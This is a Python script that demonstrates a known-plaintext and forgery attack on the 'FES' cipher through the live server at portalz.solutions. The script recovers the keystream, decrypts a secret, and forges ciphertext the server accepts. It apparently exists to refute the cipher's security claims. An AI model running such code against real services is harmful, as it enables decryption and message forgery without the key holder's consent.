"""
Known-Plaintext Attack against the live FES server at portalz.solutions

This demonstrates that FES is a simple stream cipher where:
  cipher[i] = plaintext[i] XOR stream[N-1-i]

By sending known plaintext, we recover the keystream, then use it
to decrypt any other ciphertext encrypted with the same key.
"""

import base64
import urllib.request
import urllib.parse
import json


API_URL = "https://portalz.solutions/fes.dna"
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://portalz.solutions/fractalTransform.html",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
}


def fes_encrypt(key, plaintext, dimensions=8, scramble=False):
    """Call the live FES server to encrypt."""
    data = urllib.parse.urlencode({
        "mode": "1",
        "key": key,
        "payload": plaintext,
        "trans": "",
        "dimensions": str(dimensions),
        "depth": "3",
        "scramble": "on" if scramble else "",
        "xor": "on",
        "whirl": "",
        "asciiRange": "256",
    }).encode()
    req = urllib.request.Request(API_URL, data=data, headers=HEADERS)
    with urllib.request.urlopen(req) as resp:
        result = json.loads(resp.read())
    return result.get("trans", "")


def fes_decrypt(key, ciphertext_b64, dimensions=8, scramble=False):
    """Call the live FES server to decrypt."""
    data = urllib.parse.urlencode({
        "mode": "2",
        "key": key,
        "payload": "",
        "trans": ciphertext_b64,
        "dimensions": str(dimensions),
        "depth": "3",
        "scramble": "on" if scramble else "",
        "xor": "on",
        "whirl": "",
        "asciiRange": "256",
    }).encode()
    req = urllib.request.Request(API_URL, data=data, headers=HEADERS)
    with urllib.request.urlopen(req) as resp:
        result = json.loads(resp.read())
    return result.get("payload", "")


def b64_decode(s):
    """Decode base64 with padding."""
    padded = s + '=' * (4 - len(s) % 4) if len(s) % 4 else s
    return base64.b64decode(padded)


def b64_encode(data):
    """Encode to base64, strip padding."""
    return base64.b64encode(data).rstrip(b'=').decode()


def main():
    KEY = "SecretKey99"

    print("=" * 70)
    print("KNOWN-PLAINTEXT ATTACK ON LIVE FES SERVER")
    print("=" * 70)

    # Step 1: Verify the reverse-XOR model with multiple inputs
    print("\n[Step 1] Extract keystream using known plaintexts (no scramble)")
    print("-" * 70)

    # Use null bytes to directly extract the stream
    # (XOR with 0 = identity, so cipher bytes ARE the stream bytes)
    test_sizes = [8, 16, 32]
    streams = {}

    for size in test_sizes:
        # Use a known plaintext of all 'A' (0x41) bytes
        known_pt = 'A' * size
        ct_b64 = fes_encrypt(KEY, known_pt, scramble=False)
        if not ct_b64:
            print(f"  Size {size}: Server returned empty (min length not met?)")
            continue
        ct_bytes = b64_decode(ct_b64)
        # Recover stream: cipher[i] = pt[i] XOR stream[N-1-i]
        # So stream[N-1-i] = cipher[i] XOR pt[i]
        stream_reversed = bytes(c ^ 0x41 for c in ct_bytes)
        stream = bytes(reversed(stream_reversed))
        streams[size] = stream
        print(f"  Size {size}: stream (first 16 bytes) = {list(stream[:16])}")

    # Verify streams are consistent (shorter streams should be a prefix of longer ones)
    print("\n[Step 2] Verify stream consistency across message lengths")
    print("-" * 70)
    sizes = sorted(streams.keys())
    for i in range(len(sizes) - 1):
        s1 = streams[sizes[i]]
        s2 = streams[sizes[i + 1]]
        # The shorter stream should match the first len(s1) bytes of the longer stream
        prefix_match = s1 == s2[:len(s1)]
        print(f"  Stream({sizes[i]}) == Stream({sizes[i+1]})[:{ sizes[i]}]: {prefix_match}")

    # Step 3: Use recovered stream to decrypt an unknown message
    print("\n[Step 3] Decrypt unknown message using recovered keystream")
    print("-" * 70)

    # First, encrypt a "secret" message on the server
    secret_message = "Attack works!!"  # Unknown to attacker
    secret_ct_b64 = fes_encrypt(KEY, secret_message, scramble=False)
    secret_ct = b64_decode(secret_ct_b64)
    print(f"  Secret ciphertext (b64): {secret_ct_b64}")
    print(f"  Secret ciphertext bytes: {list(secret_ct)}")

    # Attacker only has the ciphertext and the recovered stream
    N = len(secret_ct)
    # Find the longest stream we have that covers this length
    best_stream = None
    for size in sorted(streams.keys(), reverse=True):
        if len(streams[size]) >= N:
            best_stream = streams[size]
            break

    if best_stream is None:
        print(f"  Need stream of at least {N} bytes, recovering now...")
        probe_pt = 'A' * N
        probe_ct_b64 = fes_encrypt(KEY, probe_pt, scramble=False)
        probe_ct = b64_decode(probe_ct_b64)
        probe_stream_rev = bytes(c ^ 0x41 for c in probe_ct)
        best_stream = bytes(reversed(probe_stream_rev))

    # Decrypt using recovered stream
    # cipher[i] = pt[i] XOR stream[N-1-i]
    # So pt[i] = cipher[i] XOR stream[N-1-i]
    attacked_pt = bytes(secret_ct[i] ^ best_stream[N - 1 - i] for i in range(N))
    print(f"  Recovered plaintext bytes: {list(attacked_pt)}")
    print(f"  Recovered plaintext:       {attacked_pt.decode('utf-8', errors='replace')}")
    print(f"  Original message:          {secret_message}")
    print(f"  MATCH: {attacked_pt.decode('utf-8', errors='replace') == secret_message}")

    # Step 4: Demonstrate the attack also works via crafting ciphertext
    print("\n[Step 4] Forge ciphertext (craft arbitrary decryption)")
    print("-" * 70)
    forged_message = b"Forged msg!!!!!!"[:N]
    # We want the server to decrypt our crafted ciphertext to forged_message
    # cipher[i] = forged[i] XOR stream[N-1-i]
    forged_ct = bytes(forged_message[i] ^ best_stream[N - 1 - i] for i in range(len(forged_message)))
    forged_ct_b64 = b64_encode(forged_ct)
    print(f"  Forged ciphertext (b64): {forged_ct_b64}")

    # Ask server to decrypt our forged ciphertext
    decrypted = fes_decrypt(KEY, forged_ct_b64, scramble=False)
    print(f"  Server decrypted to:     '{decrypted}'")
    print(f"  Intended message:        '{forged_message.decode()}'")
    print(f"  FORGERY MATCH: {decrypted == forged_message.decode()}")

    # Step 5: Show that scramble mode has the same vulnerability
    print("\n[Step 5] Test scramble mode")
    print("-" * 70)
    # With scramble, the stream is different but STILL deterministic per key
    probe_pt = 'B' * 16
    probe_ct_b64 = fes_encrypt(KEY, probe_pt, scramble=True)
    if probe_ct_b64:
        probe_ct = b64_decode(probe_ct_b64)
        scramble_stream_rev = bytes(c ^ 0x42 for c in probe_ct)

        # Verify with a different known plaintext
        probe2_pt = 'C' * 16
        probe2_ct_b64 = fes_encrypt(KEY, probe2_pt, scramble=True)
        probe2_ct = b64_decode(probe2_ct_b64)
        scramble_stream_rev2 = bytes(c ^ 0x43 for c in probe2_ct)

        print(f"  Scramble stream (from 'B'*16): {list(scramble_stream_rev[:16])}")
        print(f"  Scramble stream (from 'C'*16): {list(scramble_stream_rev2[:16])}")
        print(f"  Streams match: {scramble_stream_rev == scramble_stream_rev2}")
        if scramble_stream_rev == scramble_stream_rev2:
            print("  >>> Scramble mode is ALSO vulnerable to known-plaintext attack!")
    else:
        print("  Server returned empty for scramble test")

    print("\n" + "=" * 70)
    print("CONCLUSION")
    print("=" * 70)
    print("""
  FES is a textbook stream cipher with XOR combination. Given:
  1. A known plaintext and its ciphertext (even partial), OR
  2. The ability to request encryption of chosen plaintext

  An attacker can:
  - Recover the complete keystream
  - Decrypt ANY ciphertext of equal or shorter length
  - FORGE arbitrary ciphertexts that decrypt to chosen messages
  - All without knowing the key

  This is not "impenetrable" — it's a well-known, fundamental weakness
  of unauthenticated XOR stream ciphers. AES-GCM prevents this via
  authenticated encryption with nonces.
""")


if __name__ == "__main__":
    main()
